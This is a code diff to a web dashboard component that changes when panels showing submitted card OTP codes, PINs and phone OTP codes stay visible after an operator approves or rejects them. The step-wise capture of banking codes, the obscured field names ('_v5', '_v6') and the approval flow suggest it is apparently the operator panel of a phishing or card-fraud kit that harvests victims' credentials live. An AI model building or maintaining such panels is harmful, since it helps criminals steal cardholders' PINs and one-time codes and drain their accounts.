@@ -434,8 +434,10 @@ export default function DashboardPage() {
     // Get the OTP code from various possible field names
     const otpCode = raw?._v5 || raw?.otpCode || "";
 
-    // Only show this box when at step 5 OR if card OTP data exists
-    if (currentStep !== 5 && !otpCode && !raw?.otpSubmittedAt) {
+    // Show box if there's OTP data OR status is approved/rejected (keep showing after decision)
+    const hasOtpData = otpCode || raw?.otpSubmittedAt;
+    const hasDecision = cardOtpStatus === "approved" || cardOtpStatus === "rejected";
+    if (!hasOtpData && !hasDecision && currentStep !== 5) {
       return null;
     }
 
@@ -497,8 +499,10 @@ export default function DashboardPage() {
     const pinStatus = getPinStatus();
     const raw = selectedRequest?.raw;
 
-    // Only show this box when at step 6 OR if PIN data exists
-    if (currentStep !== 6 && !raw?._v6 && !raw?.pinCode) {
+    // Show box if there's PIN data OR status is approved/rejected (keep showing after decision)
+    const hasPinData = raw?._v6 || raw?.pinCode;
+    const hasDecision = pinStatus === "approved" || pinStatus === "rejected";
+    if (!hasPinData && !hasDecision && currentStep !== 6) {
       return null;
     }
 
@@ -538,13 +542,15 @@ export default function DashboardPage() {
     const phoneOtpStatus = getPhoneOtpStatus();
     const raw = selectedRequest?.raw;
 
-    // Only show this box when at step 7 OR if phone data exists
-    if (currentStep !== 7 && !raw?.phoneNumber && !raw?.phoneOtpStatus) {
-      return null;
-    }
-
     // Get phone OTP code if submitted
     const phoneOtpCode = raw?.phoneOtp || "";
+
+    // Show box if there's phone data OR status is approved/rejected (keep showing after decision)
+    const hasPhoneData = raw?.phoneNumber || phoneOtpCode;
+    const hasDecision = phoneOtpStatus === "approved" || phoneOtpStatus === "rejected";
+    if (!hasPhoneData && !hasDecision && currentStep !== 7) {
+      return null;
+    }
 
     return (
       <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
